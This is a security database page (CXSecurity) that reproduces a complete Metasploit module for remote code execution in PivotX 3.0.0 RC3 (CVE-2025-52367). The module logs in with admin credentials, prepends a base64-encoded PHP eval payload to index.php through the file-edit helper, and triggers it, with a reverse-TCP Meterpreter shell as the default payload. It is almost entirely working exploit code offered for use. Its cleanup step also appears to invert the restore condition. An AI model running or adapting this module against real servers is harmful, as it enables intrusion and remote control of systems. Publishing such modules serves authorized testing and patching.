---
title: PivotX 3.0.0 RC 3 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025080012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-14
fetch_date: 2025-10-07T00:17:49.452948
---

# PivotX 3.0.0 RC 3 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **PivotX 3.0.0 RC 3 Remote Code Execution** **2025.08.13**  Credit:  **[msutovsky-r7](https://cxsecurity.com/author/msutovsky-r7/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-52367](https://cxsecurity.com/cveshow/CVE-2025-52367/ "Click to see CVE-2025-52367")**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html
include Exploit::Remote::HttpClient
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'PivotX Remote Code Execution',
'Description' => %q{
This module gains remote code execution in PivotX management system. The PivotX allows admin user to directly edit files on the webserver, including PHP files. The module exploits this by writing a malicious payload into `index.php` file, gaining remote code execution.
},
'License' => MSF\_LICENSE,
'Author' => [
'HayToN', # security research
'msutovsky-r7' # module dev
],
'References' => [
[ 'EDB', '52361' ],
[ 'URL', 'https://medium.com/@hayton1088/cve-2025-52367-stored-xss-to-rce-via-privilege-escalation-in-pivotx-cms-v3-0-0-rc-3-a1b870bcb7b3'],
[ 'CVE', '2025-52367']
],
'Targets' => [
[
'Linux',
{
'Platform' => 'php',
'Arch' => ARCH\_PHP
}
]
],
'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/reverse\_tcp' },
'DisclosureDate' => '2025-07-10',
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS]
}
)
)
register\_options([
OptString.new('USERNAME', [ true, 'PivotX username', '' ]),
OptString.new('PASSWORD', [true, 'PivotX password', '']),
OptString.new('TARGETURI', [true, 'The base path to PivotX', '/PivotX/'])
])
end
def check
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'pivotx', 'index.php')
})
return Msf::Exploit::CheckCode::Unknown('Unexpected response') unless res&.code == 200
return Msf::Exploit::CheckCode::Safe('Target is not PivotX') unless res.body.include?('PivotX Powered')
html\_body = res.get\_html\_document
return Msf::Exploit::CheckCode::Detected('Could not find version element') unless html\_body.search('em').find { |i| i.text =~ /PivotX - (\d.\d\d?.\d\d?-[a-z0-9]+)/ }
version = Rex::Version.new(Regexp.last\_match(1))
return Msf::Exploit::CheckCode::Appears("Detected PivotX #{version}") if version <= Rex::Version.new('3.0.0-rc3')
return Msf::Exploit::CheckCode::Safe("PivotX #{version} is not vulnerable")
end
def login
data\_post = Rex::MIME::Message.new
data\_post.add\_part('', nil, nil, %(form-data; name="returnto"))
data\_post.add\_part('', nil, nil, %(form-data; name="template"))
data\_post.add\_part(datastore['USERNAME'], nil, nil, %(form-data; name="username"))
data\_post.add\_part(datastore['PASSWORD'], nil, nil, %(form-data; name="password"))
res = send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'pivotx', 'index.php'),
'vars\_get' => { 'page' => 'login' },
'ctype' => "multipart/form-data; boundary=#{data\_post.bound}",
'data' => data\_post.to\_s,
'keep\_cookies' => true
})
fail\_with(Failure::NoAccess, 'Login failed, incorrect username/password') if res&.get\_html\_document&.at("//script[contains(., 'Incorrect username/password')]")
fail\_with(Failure::Unknown, 'Login failed, unable to pivotxsession cookie') unless (res&.code == 200 || res&.code == 302) && res.get\_cookies =~ /pivotxsession=([a-zA-Z0-9]+);/
@csrf\_token = Regexp.last\_match(1)
end
def modify\_file
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'pivotx', 'index.php'),
'vars\_get' => { 'page' => 'homeexplore' }
})
fail\_with(Failure::UnexpectedReply, 'Received unexpected response when fetching working directory') unless res&.code == 200 && res.body =~ /basedir=([a-zA-Z0-9]+)/
@base\_dir = Regexp.last\_match(1)
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'pivotx', 'ajaxhelper.php'),
'vars\_get' => { 'function' => 'view', 'basedir' => @base\_dir, 'file' => 'index.php' }
})
fail\_with(Failure::UnexpectedReply, 'Received unexpected response when fetching index.php') unless res&.code == 200
@original\_value = res.get\_html\_document.at('textarea')&.text
fail\_with(Failure::Unknown, 'Could not find content of index.php') unless @original\_value
res = send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'pivotx', 'ajaxhelper.php'),
'vars\_post' => { 'csrfcheck' => @csrf\_token, 'function' => 'save', 'basedir' => @base\_dir, 'file' => 'index.php', 'contents' => "<?php eval(base64\_decode('#{Base64.strict\_encode64(payload.encoded)}')); ?> #{@original\_value}" }
})
fail\_with(Failure::PayloadFailed, 'Failed to insert malicious PHP payload') unless res&.code == 200 && res.body.include?('Wrote contents to file index.php')
end
def trigger\_payload
send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'index.php')
})
end
def restore
res = send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'pivotx', 'ajaxhelper.php'),
'vars\_post' => { 'csrfcheck' => @csrf\_token, 'function' => 'save', 'basedir' => @base\_dir, 'file' => 'index.php', 'contents' => @original\_value }
})
vprint\_status('Restoring original content')
vprint\_error('Failed to restore original content') unless res&.code == 200 && res.body.include?('Wrote contents to file index.php')
end
def cleanup
super
# original content can be any string, it cannot be nil
restore if @original\_value.nil?
end
def exploit
vprint\_status('Logging in PivotX')
login
vprint\_status('Modifying file and injecting payload')
modify\_file
vprint\_status('Triggering payload')
trigger\_payload
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025080012)

[Tweet](https://twitter.com/share)

Vote for this issue:
...